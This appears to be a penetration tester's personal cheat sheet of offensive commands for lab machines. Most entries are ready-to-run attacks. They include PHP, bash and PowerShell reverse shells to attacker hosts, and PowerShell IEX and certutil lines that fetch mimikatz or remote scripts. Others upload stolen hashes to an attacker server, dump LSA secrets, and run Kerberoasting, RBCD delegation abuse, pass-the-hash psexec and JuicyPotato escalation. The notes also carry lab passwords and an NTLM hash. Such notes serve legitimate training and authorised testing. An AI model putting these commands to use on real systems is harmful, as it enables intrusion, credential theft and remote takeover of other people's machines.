### Spawn shell via Python
`python -c 'import pty;pty.spawn("/bin/bash")' `
​ 
### Convert SSH private key to hash for brute force
`ssh2john.py in-file-privkey > out-file.hash` 
`john out-file.hash --wordlist=/usr/share/wordlists/rockyou.txt`
​
### Copy ssh private key for auth
`openssl rsa -in in-file-privkey -out outfile` 

### use key for ssh
`ssh -i key-file user@10.10.10.17` 

### grep for a string in a dir of files
`grep -ls 'pass' ${PWD}/* `

### powershell recursive grep like search
`ls -R -Hidden -EA SilentlyContinue | select-string <search string>`
​
### Powershell to upload to Kali
`PS C​:\Tools\active_directory> powershell (​New​-​Object System​.​Net​.​WebClient​)​.​UploadFile​(​'http://192.168.119.143/upload.php'​, 'C:\Tools\active_directory\hashes'​)`
​
### Check if Powershell is running as 32 or 64 bit (Helpful to check if kernel exploits are failing)
`PS C:\Users> [Environment]::Is64BitProcess` returns true/false 
if running as 32 bit, call the powershell from `C:\windows\sysNative` instead of `C:\windows\system32` 
Example - `C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe+IEX(New-Object+Net.WebClient).downloadString('http%3a//10.10.14.10/rev.ps1')`  
More info in writeup for [Optimum](https://0xdf.gitlab.io/2021/03/17/htb-optimum.html)

### Powershell to grab remote file and run it in memory
`powershell.exe -exec Bypass -​C "IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.143:8000/mimikatz.exe');"`
​
### Get password hashes from mimi. 
`lsadump:​:lsa /patch`
​
### Find msfvenom payload
`msfvenom -l payloads | grep linux/x86`
​
### nmap scan for shellshock
`nmap -sV -p 80 --script http-shellshock --script-args uri=/cgi-bin/user.sh 10.10.10.56` 

### Run burp from command line
`java -jar -Xmx4g ~/OffSec/Burp/burpsuite_community_v2021.12.1.jar`
​
### Fix $PATH on Windows (good if whoami, certutil and other exe's are "not recognized")
`set PATH=%SystemRoot%\system32;%SystemRoot%;` 

### set up ssh port forwarding with compromised user - good if you cannot use chisel 
`sudo ssh -L 80:192.168.120.209:80 <compromised_user>@192.168.120.209` 

### Setting up chisel w/ socks proxy
*On the compromised host that you want to pivot through, proxychains socks5 needs configured* 
`./chisel client 10.10.15.4:8000 R:socks` 
*On Kali* 
`chisel server --socks5 -p 8000 -reverse`

### Proxychains nmap example
`sudo proxychains -q nmap --top-ports=1000 -Pn -sT -v -oA nmap_172.16.1.102 172.16.1.102` 

### Powershell download from http server 
`powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.143:8000/Invoke-Kerberoast.ps1', 'Invoke-Kerberoast.ps1')`

### Powershell Upload to kali - Make sure apache is running and the upload.php is there! 
`powershell (New-Object System.Net.WebClient).UploadFile('http://192.168.119.143/upload.php', 'asrep_hashes.txt')`

### Certutil transfer **HIGHLY EFFECTIVE**
`certutil.exe -urlcache -split -f http://192.168.119.143:8000/mimikatz.exe`

### If certutil fails try bitsadmin
`bitsadmin /transfer job /download /priority high http://192.168.245.139/nc.exe c:\\pwn\\nc.exe'`

### ldapsearch to get object in a directory 
`ldapsearch -v -x -b "DC=hutch,DC=offsec" -H "ldap://192.168.169.122" "(objectclass=*)"` 

### Dump AD Users properties (w/ shell)
`get-aduser -filter * -properties *` 

### Import ps1 module
`import-module $PATH\powerview.ps1` 

### Use Powermad.ps1 to add new machine account 
`New-MachineAccount -MachineAccount MYFAKECOMPUTER -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose` 

### Set PrincipalsAllowedToDelegateToAccount property on a host
`Set-ADComputer $host -PrincipalsAllowedToDelegateToAccount MYFAKECOMPUTER$`

### Confirm the PrincipalsAllowedToDelegateToAccount property is changed  
`Get-ADComputer $host -Properties PrincipalsAllowedToDelegateToAccount`

### Search for computers with PrincipalsAllowedToDelegateToAccount set 
`Get-DomainComputer | Where-Object {$_."msDs-AllowedToActOnBehalfofOtherIdentity" -ne $null}` 

### Get kerberos ticket via computer with ability to impersonate via PrincipalsAllowedToDelegateToAccount
`getST.py -spn cifs/dc.support.htb -impersonate administrator support/MYFAKECOMPUTER$` 

### export kerberos ticket in Kali
`export KRB5CCNAME=~/administrator.ccache` 

### use rbcd.py to create delegation to DC$ 
`rbcd.py -delegate-to DC$ -dc-ip 10.10.11.174 -action read support/MYFAKECOMPUTER$:123456` 

### secretsdump.py with kerberos 
`secretsdump.py -k -no-pass dc.support.htb` 

### psexec.py with hash example 
`psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:bb06cbc02b39abeddd1335bc30b19e26 Administrator@10.10.11.174` 

### use ps remoting to invoke commands powershell 

```
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername dc01 -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
``` 

### LAPS dump password by computername
`Get-AdmPwdPassword -ComputerName dc01 | Select-Object Password,ExpirationTimestamp` 

### Check for LAPS passowrd w/ AD-Module
`Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime` 

### Kerberoasting w/ impacket
`GetUserSPNs.py -request -dc-ip 10.10.252.24 controller.local/machine1 -outputfile hashes.kerberoast` 

### LDAP search for LAPS passwords 
`ldapsearch -v -x -D fmcsorley@HUTCH.OFFSEC -w CrabSharkJellyfish192 -b "DC=hutch,DC=offsec" -h 192.168.120.108 "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd` 

### Using ldapsearch to enumerate a Windows domain
`ldapsearch -H ldap://<ip>:<port> -x -LLL -s sub -b "DC=<domain>,DC=local"` 

### Get shares from SMB *highly effective* 
`smbclient -L \\shenzi.local -I 192.168.191.55 -N`

### Mount that share! 
`smbclient \\\\shenzi.local\\Shenzi -I 192.168.191.55 -N`

### Enumerating users on a Windows domain with rpcclient (without credentials)

```
rpcclient -U "" -N <ip>
    rpcclient $> enumdomusers
    rpcclient $> queryuser <user_RID>
```

### JuicyPotato 
`JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {69AD4AEE-51BE-439b-A92C-86AE490E8B30}` 

### Kerberoasting w/ Rubeus
`Rubeus.exe kerberoast /outfile:hashes.txt` 

### Hashcat cracking krbtg5
`hashcat -m 13100 --force -a 0 hashes.txt /usr/share/wordlists/rockyou.txt` 

`hashcat --show hashes.txt` 

### Compile C# File
`[DIRECTORY_TO_.NET]\csc.exe [.CS_FILE]`
`EX: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe test.cs`

## Compile .java to Class
`javac -source [VERSION_OF_.JAVA_FILE] -target [DESIRED_VERSION_OF_.CLASS_FILE] [.JAVA_FILE]`
`EX:  javac -source 1.8 -target 1.8 test.java`

## Build Java Manifest
`mkdir META-INF; echo "Main-Class: [JAVA_CLASS]" > META-INF/MANIFEST.MF`
`EX: mkdir META-INF; echo "Main-Class: test" > META-INF/MANIFEST.MF`

## Create JAR File
`jar cmvf META-INF/MANIFEST.MF [JAR_FILE] [CLASS_FILE]`
`EX: jar cmvf META-INF/MANIFEST.MF test.jar test.class`

## Start SMB Server
`smbserer.py [SHARE_NAME] [SHARE_PATH]`
`smbserver.py test .`

## RDP to Machine
`xfreerdp +nego +sec-rdp +sec-tls +sec-nla /d: /u: /p: /v:[MACHINE_NAME] /u:[USERNAME] /p:[PASSWORD] /size:1180x708`
`EX: xfreerdp +nego +sec-rdp +sec-tls +sec-nla /d: /u: /p: /v:manageengine /u:administrator /p:studentlab /size:1800x900`

## SSH using specific algorithm
`ssh -o KexAlgorithms=[ALGORITHM] [USERNAME]@[SERVER]`
`EX: ssh -o KexAlgorithms=diffie-hellman-group1-sha1 atmail@atmail`
USE CASE:
    - $ ssh atmail@atmail -> Unable to negotiate with 192.168.132.106 port 22: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1

## mysql scripts and brute force
`nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 192.168.52.88`

`nmap --script=mysql-brute 192.168.52.88`

## Connect to MySQL DB
`mysql [TABLE] -u [DB_USERNAME] -p`
`EX: mysql atmail6 -u root -p`

## Find users and reset passwords mySql Mariadb 
`select user_login, user_pass from wp_users;` 
```
+------------+------------------------------------+
| user_login | user_pass                          |
+------------+------------------------------------+
| admin      | $P$BaWk4oeAmrdn453hR6O6BvDqoF9yy6/ |
+------------+------------------------------------+
```

`update wp_users set user_pass=md5('admin') where user_login='admin';` 

## PHP Reverse Shell
`<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/[ATTACKER_IP]/[PORT] 0>&1'"); ?>`

## Grep all files returned from a grep
`grep [OPTIONS] [PATH_TO_SEARCH] [SEARCH_STRING] | sed "s/:/  /g" | awk '{print $1}' > /tmp/files.txt; grep [SEARCH_STRING] $(cat /tmp/files.txt) --color; rm -rf /tmp/files.txt;`
`EX: grep -rnw /var/www/html -e "^.*user_location.*public.*" | sed "s/:/  /g" | awk '{print $1}' > /tmp/files.txt; grep "isset" $(cat /tmp/files.txt) --color; rm -rf /tmp/files.txt;`

## Find files for white-box testing
`sudo find / -name [FILENAME]`
`sudo find / -name *.[EXTENSION]`
`sudo find [WEBROOT] -type d -perm -o+w`

## Disable invalid cert warnings in Python
`import requests, urllib3 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)`

## Get latest PostgreSQL log entries by REGEX in Powershell
`Get-Content .\[LOG_FILE] -tail 10 | Select-String -pattern [REGEX] -context 0,[NUMBER_OF_LINES_AFTER_REGEX_TO_SHOW]`
`EX: Get-Content .\postgresql_08.log -tail 10 | Select-String -pattern error -context 0,2`

## Sed replace new-line
`sed ':a;N;$!ba;s/\n/[STRING_TO_REPLACE]/g' [FILE]`
`EX: sed ':a;N;$!ba;s/\n & /g' manage-engine_payload.bat`

## tr remove new-line
`tr -d "\n"`

## Powershell Rev Shell One-Liner
`$client = New-Object System.Net.Sockets.TCPClient('192.168.119.132',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};`

### Stop service
`net stop "[SERVICE]"`
`EX: net stop "Applications Manager"`

### Delete custom dll
`del [DLL_FILE]`
`EX: del c:\awae.dll`

### Restart service
`net start "[SERVICE]"`
`EX: net start "Applications Manager"`

### Drop the function
`DROP FUNCTION [FUNCTION];`
`EX: DROP FUNCTION test(text, integer);`

### Build C Program
1. Save code as .c
2. `gcc [PROGRAM].c -o [PROGRAM_NAME]`


### Reverse shell when you have command injection through java's exec() method
`/bin/bash -c bash${IFS}-i${IFS}>&/dev/tcp/1.2.3.4/4242<&1`

### MySQL
Log File: my.cnf
Enable Logging:
    ~ Search for "log"
    ~ Uncomment the following lines:
        general_log_file        = /var/log/mysql/mysql.log
        general_log             = 1
    ~ Restart service
        sudo systemctl restart mysql

### PHP
Log File: php.ini
Enable Logging:
    ~ Search for "display_errors"
    ~ Uncomment and set to "On"
    ~ Restart service
        sudo systemctl restart [WEB_SERVER]

### PostGRES
Log File: postgresql.conf
Enable Logging:
    ~ Search for "log_statement"
    ~ Uncomment and set to "all"
    ~ Restart service

### MariaDB
Log File: my.cnf
Enable Logging:
    ~ Search for "general_log"
    ~ Uncomment the following lines:
        general_log_file = /var/log/mysql/mysql.log
        general_log = 1
    ~ Restart service
        sudo systemctl restart mysql


## Wordpress
`wp-scan`
